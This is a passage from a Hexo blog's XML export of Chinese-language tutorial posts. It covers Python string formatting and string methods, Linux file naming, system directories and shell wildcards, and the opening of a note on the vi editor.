        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（六）·字符串</title>
    <url>/5cbe76b3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>我们已经学习了字符串的使用方法，我们还学习了使用索引和分片操作字符串，经历了这么长的时间，相信大家也有所掌握；本节将讨论并学习字符串的格式化与字符串的常用方法</p>
<span id="more"></span>

<h2 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h2><p>字符串是序列的一种，所以所有的通用序列操作当然都适用啦，这里就不再重复了，下面我们来探讨字符串的格式化</p>
<p>何为字符串格式化？字符串格式化就是指把数据按照一定的格式组成一个字符串，这貌似很难说清楚，下面来看个例子：</p>
<p>现有下列变量：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">year <span class="token operator">=</span> <span class="token number">2018</span>
month <span class="token operator">=</span> <span class="token number">3</span>
day <span class="token operator">=</span> <span class="token number">9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>我们要输出格式为“年|月|日”的字符串，那么我们可以使用加号<code>+</code>来进行拼接字符串：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">output <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>year<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'|'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>month<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'|'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>day<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>我们将year、month、day三个变量按照一定的格式组成了一个字符串，这样的过程就可以称为字符串格式化。</p>
<p>然而，今天我们来探讨的不是以这种拼接方式实现的字符串格式化，而是以用数据填充模板的方式来实现，也就是我们给出一个模板“年|月|日”，我们只需要提供三个值，年、月、日，然后就生成我们想要的字符串。</p>
<p>python支持的字符串格式方式有两种，下面来一一介绍</p>
<h3 id="传统方式"><a href="#传统方式" class="headerlink" title="传统方式"></a>传统方式</h3><p>第一种字符串格式化使用百分号<code>%</code>来实现，在<code>%</code>的左边是<strong>格式化字符串</strong>，也就是我们的模板，右边是我们用来格式化的数据（<strong>元组类型</strong>），也就是用来填充的值，举例如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> year <span class="token operator">=</span> <span class="token number">2018</span>
<span class="token operator">>></span><span class="token operator">></span> month <span class="token operator">=</span> <span class="token number">3</span>
<span class="token operator">>></span><span class="token operator">></span> day <span class="token operator">=</span> <span class="token number">9</span>
<span class="token operator">>></span><span class="token operator">></span> output <span class="token operator">=</span> <span class="token string">'%s|%s|%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>year<span class="token punctuation">,</span> month<span class="token punctuation">,</span> day<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
<span class="token number">2018</span><span class="token operator">|</span><span class="token number">3</span><span class="token operator">|</span><span class="token number">9</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>模板字符串中的<code>%s</code>叫做<strong>转换说明符</strong>，也叫占位符，就是用来占着位置，等待被替换成提供的值，s表示这个位置将替换成字符串，如果值不是字符串，就使用str函数转换成字符串，完整的转换说明符，由以下部分<strong>按顺序</strong>组成：</p>
<ol>
<li><code>%</code>字符：这是转换说明符的开始</li>
<li>转换标志（可选）：<code>-</code>表示左对齐，+表示在数值前加上正负号，空格表示正数之前保留空格，0表示转换值后位数不足就用0填充</li>
<li>最小字段宽度（可选）：转换后的值不能短于该值指定的宽度，如果该位置写的是<code>*</code>，则宽度由<code>%</code>右边的元组提供</li>
<li>点<code>.</code>后跟<strong>精度</strong>值（可选）：如果转换的是浮点数，精度值就表示小数点后的位数，如果转换的是字符串，精度值就表示最大的字段宽度，如果为<code>*</code>，那么该值由<code>%</code>右边的元组提供</li>
<li>转换类型：看下表：</li>
</ol>
<table>
<thead>
<tr>
<th>转换类型</th>
<th>含义</th>
<th>例子</th>
</tr>
</thead>
<tbody><tr>
<td>d或i</td>
<td>有符号的十进制整数</td>
<td><code>&#39;%d&#39; % 123</code> =&gt; <code>&#39;123&#39;</code></td>
</tr>
<tr>
<td>o</td>
<td>无符号的八进制整数</td>
<td><code>&#39;%o&#39; % 8</code> =&gt; <code>&#39;10&#39;</code></td>
</tr>
<tr>
<td>u</td>
<td>无符号十进制整数</td>
<td><code>&#39;%u&#39; % 123</code> =&gt; <code>&#39;123&#39;</code></td>
</tr>
<tr>
<td>x</td>
<td>无符号十六进制整数(小写)</td>
<td><code>&#39;%x&#39; % 123</code> =&gt; <code>&#39;7b&#39;</code></td>
</tr>
<tr>
<td>X</td>
<td>无符号十六进制整数（大写）</td>
<td><code>&#39;%x&#39; % 123</code> =&gt; <code>&#39;7B&#39;</code></td>
</tr>
<tr>
<td>e</td>
<td>科学计数法表示的浮点数（小写）</td>
<td><code>&#39;%e&#39; % 123.456</code> =&gt; <code>&#39;1.234560e+02&#39;</code></td>
</tr>
<tr>
<td>E</td>
<td>科学计数法表示的浮点数（小写）</td>
<td><code>&#39;%E&#39; % 123.456</code> =&gt; <code>&#39;1.234560E+02&#39;</code></td>
</tr>
<tr>
<td>f，F</td>
<td>十进制浮点数</td>
<td><code>&#39;%f&#39; % 123.456</code> =&gt; <code>&#39;123.456000&#39;</code>、<code>&#39;%F&#39; % 123.456</code> =&gt; <code>&#39;123.456000&#39;</code></td>
</tr>
<tr>
<td>g</td>
<td>如果指数大于-4或者小于精度值则和e相同，其它情况与f相同</td>
<td>略</td>
</tr>
<tr>
<td>G</td>
<td>如果指数大于-4或者小于精度值则和E相同，其它情况与F相同</td>
<td>略</td>
</tr>
<tr>
<td>c</td>
<td>单字符串（ASCII码值或则单字符字符串）</td>
<td><code>&#39;%c&#39; % 65</code> =&gt; <code>&#39;A&#39;</code>、<code>&#39;%c&#39; % &#39;a&#39;</code> =&gt; <code>&#39;a&#39;</code></td>
</tr>
<tr>
<td>r</td>
<td>字符串（使用repr函数转换任意python对象）</td>
<td><code>&#39;hello %r!&#39; % &#39;world&#39;</code> =&gt; <code>&quot;hello &#39;world&#39;!&quot;</code></td>
</tr>
<tr>
<td>s</td>
<td>字符串（使用str函数转换任意python对象</td>
<td><code>&#39;hello %s!&#39; % &#39;world&#39;</code> =&gt; <code>&#39;hello world!&#39;</code></td>
</tr>
</tbody></table>
<p>看到这个表相信大家都晕了，告诉大家一个秘密，我从来没有记住这个表！<code>⊙▽⊙</code></p>
<p>因为一般来说，大多数的值都是可以转换成字符串的，所以最常用的转换说明符也就一个<code>%s</code>。<code>(～￣▽￣)～</code></p>
<p>虽然不需要记住那么多的转换类型，但有些细节还是要记住的！</p>
<h4 id="字段宽度和精度"><a href="#字段宽度和精度" class="headerlink" title="字段宽度和精度"></a>字段宽度和精度</h4><p>字段宽度是转换后的值所占的最少字符个数，精度就是转换后的小数位数（对于浮点数），或者转换后最大字符个数（对于字符串），这两个参数都是整数或者星号<code>*</code>，它们之间用点<code>.</code>分隔（如果只指定宽度不指定精度就不必要使用点<code>.</code>），举例如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%9f'</span> <span class="token operator">%</span> <span class="token number">1.0</span> <span class="token comment"># 字段宽度为9</span>
<span class="token string">' 1.000000'</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%9.1f'</span> <span class="token operator">%</span> <span class="token number">1.0</span> <span class="token comment"># 字段宽度为9精度为1</span>
<span class="token string">'      1.0'</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%.2f'</span> <span class="token operator">%</span> <span class="token number">1.1</span> <span class="token comment"># 精度为2</span>
<span class="token string">'1.10'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到，转换后的字符串宽度不足时，默认在左边用空格填充</p>
<p>使用星号<code>*</code>的时候，需提供相应的宽度或精度：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%.*s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'hello world!'</span><span class="token punctuation">)</span>  <span class="token comment"># 精度为5</span>
<span class="token string">'hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="标志"><a href="#标志" class="headerlink" title="标志"></a>标志</h4><p>紧接着<code>%</code>，我们可以使用一个标志，这个标志可以是<code>0</code>、<code>+</code>、<code>-</code>或者<strong>空格</strong></p>
<ul>
<li><code>0</code>表示数字的填充符使用0：  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%09f'</span> <span class="token operator">%</span> <span class="token number">1.0</span>
<span class="token string">'01.000000'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li><code>+</code>表示给数值加上正负号：  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%+d'</span> <span class="token operator">%</span> <span class="token number">12</span>
<span class="token string">'+12'</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%+d'</span> <span class="token operator">%</span> <span class="token operator">-</span><span class="token number">12</span>
<span class="token string">'-12'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><code>-</code>表示左对齐数值：  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'%-9f'</span> <span class="token operator">%</span> <span class="token number">1.0</span>
<span class="token string">'1.000000 '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li><strong>空格</strong>表示在正数前加上空格：  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'% d'</span> <span class="token operator">%</span> <span class="token number">12</span>
<span class="token string">' 12'</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'% d'</span> <span class="token operator">%</span> <span class="token operator">-</span><span class="token number">12</span>
<span class="token string">'-12'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

</li>
</ul>
<hr>
<p><strong>补充</strong>：<code>%%</code>表示百分号<code>%</code>本身</p>
<p>学过C语言的都知道，这种传统的字符串格式化方式和C语言的字符串格式化方式大同小异，但是这种方式正逐渐被python抛弃，python官方推荐下面这种新的字符串格式化方式</p>
<h3 id="更先进的方式"><a href="#更先进的方式" class="headerlink" title="更先进的方式"></a>更先进的方式</h3><p>python的字符串有一个format方法，这个方法正是使用新版字符串格式化的渠道，下面是用法：</p>
<p>基本用法：使用<code>&#123;&#125;</code>做占位符，<strong>按顺序</strong>填充参数：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'hello &#123;&#125;, I am &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'world'</span><span class="token punctuation">,</span> <span class="token string">'Lee'</span><span class="token punctuation">)</span>
<span class="token string">'hello world, I am Lee'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>使用数字指定参数的位置（从0开始）：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'Between &#123;0&#125; and &#123;1&#125;, I like &#123;0&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'banana'</span><span class="token punctuation">)</span>
<span class="token string">'Between apple and banana, I like apple'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>使用关键字参数指定参数：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'I am &#123;name&#125;, and my age is &#123;age&#125;.'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'Lee'</span><span class="token punctuation">,</span> age<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">)</span>
<span class="token string">'I am Lee, and my age is 18.'</span>
<span class="token operator">>></span><span class="token operator">></span> d <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Lee'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">18</span><span class="token punctuation">&#125;</span>  <span class="token comment"># 使用字典</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'I am &#123;name&#125;, and my age is &#123;age&#125;.'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token operator">**</span>d<span class="token punctuation">)</span>  <span class="token comment"># 展开字典</span>
<span class="token string">'I am Lee, and my age is 18.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还可以通过列表索引来指定参数：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Lee'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'I am &#123;0[0]&#125;, and my age is &#123;0[1]&#125;.'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span>
<span class="token string">'I am Lee, and my age is 18.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>花括号<code>&#123;&#125;</code>中使用冒号<code>:</code>分隔，左边指定字段名（数字，关键字等），右边按顺序指定：</p>
<ol>
<li><strong>填充字符</strong>：用于填充的字符，默认为空格</li>
<li><strong>对齐方式</strong> ：<ul>
<li><code>^</code> 居中</li>
<li><code>&lt;</code> 左对齐</li>
<li><code>&gt;</code> 右对齐</li>
</ul>
</li>
<li><strong>正负号</strong>：<ul>
<li><code>+</code> 给数字加上正负号</li>
<li><code>-</code> 只给负数加上负号（默认）</li>
<li><strong>空格</strong> 给正数加上空格</li>
</ul>
</li>
<li><strong>宽度</strong>：指定最小字段宽度，以0开始表示用0填充</li>
<li><strong>精度</strong>：在宽度字段后添加一个点<code>.</code>再写此字段，表示小数点后的位数（对于浮点数），或者最大字段宽度（对于字符串）</li>
<li><strong>转换类型</strong>：大致与传统方式相同</li>
</ol>
<p><strong>补充</strong>：两个<code>&#123;</code>表示<code>&#123;</code>本身，两个<code>&#125;</code>表示<code>&#125;</code>本身。</p>
<p>读者可以参照这篇文章，写得比较详细：<a href="https://blog.csdn.net/jpch89/article/details/84099277">Python 中 str.format() 方法详解</a></p>
<hr>
<h2 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h2><p>了解了这么多的字符串格式化方式，该介绍几个字符串常用方法了。</p>
<p>要记住字符串是<strong>不可变</strong>的，所以下面介绍到的方法都不会改变原来的字符串！</p>
<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>find方法用于在一个字符串中查找一个子串，返回第一个匹配字串的首字符索引，如果没有找到就返回-1，举例如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'hello Lee'</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'Lee'</span><span class="token punctuation">)</span>
<span class="token number">6</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'hello Lee'</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'jack'</span><span class="token punctuation">)</span>
<span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>还可以指定查找的起点、终点（<strong>不包含</strong>）：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> <span class="token string">'hello Lee'</span>
<span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'Lee'</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>  <span class="token comment"># 指定起点</span>
<span class="token operator">-</span><span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'Lee'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span>  <span class="token comment"># 指定起点和终点</span>
<span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><p>replace方法用于返回替换后的字符串，如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'hello world!'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'world'</span><span class="token punctuation">,</span> <span class="token string">'Lee'</span><span class="token punctuation">)</span>  <span class="token comment"># 用'Lee'替换'world'</span>
<span class="token string">'hello Lee!'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="translate"><a href="#translate" class="headerlink" title="translate"></a>translate</h3><p>和replace方法类似，但是可以同时替换多个字符，用法如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> table <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span><span class="token string">'hw'</span><span class="token punctuation">,</span> <span class="token string">'HW'</span><span class="token punctuation">)</span> <span class="token comment"># 制作映射表，h=>H，w=>W</span>
<span class="token operator">>></span><span class="token operator">></span> table
<span class="token punctuation">&#123;</span><span class="token number">104</span><span class="token punctuation">:</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">:</span> <span class="token number">87</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'hello world'</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span>table<span class="token punctuation">)</span>
<span class="token string">'Hello World'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="strip"><a href="#strip" class="headerlink" title="strip"></a>strip</h3><p>该方法用于去除两侧指定的字符串（默认为<strong>空白符</strong>，即空格、制表符、换行符等），如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">' hello world     '</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'hello world'</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'**hello world***'</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span>
<span class="token string">'hello world'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>补充</strong>：lstrip只作用于字符串<strong>左端</strong>，rstrip只作用于字符串<strong>右端</strong></p>
<h3 id="split和join"><a href="#split和join" class="headerlink" title="split和join"></a>split和join</h3><p>split方法用来讲字符串分割成序列，如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> <span class="token string">'Guangdong, Zhejiang, Shanghai'</span>
<span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>  <span class="token comment"># 用逗号','作为分割符</span>
<span class="token punctuation">[</span><span class="token string">'Guangdong'</span><span class="token punctuation">,</span> <span class="token string">' Zhejiang'</span><span class="token punctuation">,</span> <span class="token string">' Shanghai'</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 默认使用空白符（空格、制表符、换行符等）作为分割符</span>
<span class="token punctuation">[</span><span class="token string">'Guangdong,'</span><span class="token punctuation">,</span> <span class="token string">'Zhejiang,'</span><span class="token punctuation">,</span> <span class="token string">'Shanghai'</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 分割1次  </span>
<span class="token punctuation">[</span><span class="token string">'Guangdong'</span><span class="token punctuation">,</span> <span class="token string">' Zhejiang, Shanghai'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>补充</strong>：rsplit从<strong>右边</strong>开始分割</p>
<p>join用于将序列连接成字符串，如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token string">'world'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token string">'hello,world'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="lower和upper"><a href="#lower和upper" class="headerlink" title="lower和upper"></a>lower和upper</h3><p>lower方法和upper方法分别返回转换成小写和大写的字符串，如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'AbcD'</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'abcd'</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'AbcD'</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'ABCD'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>本节内容较多，好好消化吧！</p>
<p>不知道下一次有时间更新又是什么时候咯 <code>ヾ(￣▽￣)Bye~Bye~</code></p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开发环境及应用·第三周·文件名和文件通配符</title>
    <url>/536af7d3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本文整理了有关文件名和文件通配符的笔记</p>
<span id="more"></span>

<h2 id="文件和目录的命名规则"><a href="#文件和目录的命名规则" class="headerlink" title="文件和目录的命名规则"></a>文件和目录的命名规则</h2><p>文件名的长度：一般在<strong>1～255</strong>个字符，有些Unix不支持长文件名，但至少支持到<strong>14</strong>个字符</p>
<p>文件名合法名称：</p>
<ul>
<li>斜线<code>/</code>留做路径名分割符，不可使用，其它都可使用</li>
<li>因为字节0是字符串的结束符，理所当然地不能出现在文件名，要是出现了，就截断了文件名了</li>
</ul>
<p>在Linux下，文件名是<strong>大小写敏感</strong>的，即<code>test.txt</code>和<code>Text.Txt</code>是不同的文件，为了便于Windows与Linux之间的迁移，最好不要依靠文件名字母大小写来区分不同的文件</p>
<h2 id="系统目录"><a href="#系统目录" class="headerlink" title="系统目录"></a>系统目录</h2><h3 id="etc"><a href="#etc" class="headerlink" title="/etc"></a>/etc</h3><p>/etc目录下主要存放了供系统维护管理用的命令和配置文件（功能类似Windows的注册表），如：</p>
<ul>
<li>passwd文件保存了用户的密码hash值、HOME目录路径等信息</li>
<li>hosts文件</li>
<li>一系列的*.conf文件</li>
<li>ssh，apt等目录</li>
<li>系统启动阶段系统初始化和启动各服务的脚本rc*.d</li>
<li>profile/bash.bashrc 系统级的bash等shell偏好设置</li>
<li>自定义的需要自启动的服务脚本rc.local</li>
</ul>
<h3 id="tmp"><a href="#tmp" class="headerlink" title="/tmp"></a>/tmp</h3><p>/tmp是用来存放临时文件的目录，通常系统关机时，该目录的文件会被清除。</p>
<p>每个用户都可以在这里临时创建文件，但只能删除自己的文件，不可以删除其他用户创建的文件</p>
<h3 id="var"><a href="#var" class="headerlink" title="/var"></a>/var</h3><p>/var目录存放了系统运行时要改变的数据，系统日志等</p>
<h3 id="可运行程序"><a href="#可运行程序" class="headerlink" title="可运行程序"></a>可运行程序</h3><p>可运行程序一般存放在以下几个目录：</p>
<ul>
<li>/bin 系统常用命令，如ls、ln、cp、cat等</li>
<li>/usr/bin 存放常用命令，如ssh、ftp、make、gcc等</li>
<li>/sbin，/usr/sbin 系统管理员专用命令</li>
</ul>
<h3 id="dev"><a href="#dev" class="headerlink" title="/dev"></a>/dev</h3><p>/dev目录下都是一些设备文件，如终端设备，打印机等</p>
<h3 id="头文件和库文件"><a href="#头文件和库文件" class="headerlink" title="头文件和库文件"></a>头文件和库文件</h3><p>/usr/include目录下是一些C语言头文件（usr是Unix System Resource的缩写）</p>
<p>/lib，/usr/lib下的文件主要是各种库文件，C语言的链接库文件，以及terminfo终端库等。</p>
<ul>
<li>静态链接库.a文件（a是archive的缩写，译为“存档”）</li>
<li>动态链接库.so文件（shared objects：“共享目标代码”，多个.o文件集成）</li>
</ul>
<p>gcc编译器通过<code>-static</code>选项来使用静态链接，静态链接的程序一般要比动态链接的程序要大得多</p>
<hr>
<h2 id="文件通配符规则"><a href="#文件通配符规则" class="headerlink" title="文件通配符规则"></a>文件通配符规则</h2><ul>
<li>星号<code>*</code>：匹配任意长度的文件名字符串（<strong>包括空字符串</strong>）<br>  <strong>注意</strong>：<ul>
<li>点字符<code>.</code>，当它作为文件名或路径名分量的第一个字符时，必须<strong>显式</strong>匹配，如：<code>*file</code>不匹配<code>.profile</code>，<code>.*file</code>才匹配<code>.profile</code></li>
<li>斜线<code>/</code>也要显式匹配</li>
</ul>
</li>
<li>问号<code>?</code>：匹配任一单字符</li>
<li>方括号<code>[]</code>：匹配括号内任一字符，也可用减号<code>-</code>指定一个范围，如：<code>[A-Z]*</code>、<code>*.[ch]</code></li>
<li>波浪线<code>~</code>：<br>  <code>～</code>：当前用户的主目录（HOME目录）<br>  <code>~lee</code>：用户lee的主目录（HOME目录）</li>
</ul>
<p><strong>注意</strong>： <code>.</code>是当前目录，<code>..</code>是上级目录，这两个是真实存在的文件，不是通配符处理程序解释出来的；不同shell的通配符会略有差别；</p>
<hr>
<h2 id="文件通配符处理过程"><a href="#文件通配符处理过程" class="headerlink" title="文件通配符处理过程"></a>文件通配符处理过程</h2><p>文件通配符的处理由shell完成，分三步：</p>
<ol>
<li>在shell提示符下，从键盘输入命令，被shell接受</li>
<li>shell对所键入的内容作若干加工处理，其中含有对文件通配符的展开工作，生成结果命令</li>
<li>执行生成的结果命令</li>
</ol>
<p>例如：</p>
<ul>
<li>手工键入<code>vi m*e</code>，实际上执行了<code>vi makefile</code></li>
<li>手工键入<code>ls *.txt</code>，实际上执行了<code>ls 1.txt 2.txt 3.txt</code></li>
</ul>
<p><strong>注意</strong>：Windows由命令自身处理通配符（也就是cmd不处理），而Linux由shell处理</p>
]]></content>
      <categories>
        <category>MOOC课程学习·Linux开发环境及应用</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开发环境及应用·第三周·vi编辑器</title>
    <url>/e411af14/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本文整理了vi编辑其使用方法和常见的问题</p>
<span id="more"></span>

<p>vi用于编辑文件，它有一个增强版命令叫vim，语法上vim是兼容vi的，只需要学习好vi就基本可以使用vim了，下面是整理到的笔记</p>
<h3 id="用户配置文件"><a href="#用户配置文件" class="headerlink" title="用户配置文件"></a>用户配置文件</h3><p>用户的HOME目录下，存在一个.exrc文件（每个用户独立配置），在里面可以配置vi编辑器的一些偏好设置，比如是否显示行号，制表符的长度等等。</p>
<p>最常用的配置为：</p>
<ul>
<li>set number  # 显示行号</li>
<li>set tabstop=4  # 制表符长度为4</li>
</ul>
<p>这里不详细记录其它配置</p>
<h3 id="工作状态"><a href="#工作状态" class="headerlink" title="工作状态"></a>工作状态</h3><p>vi有两种工作状态，分别为<strong>命令状态</strong>（启动时进入此状态）和<strong>文本状态</strong>。</p>
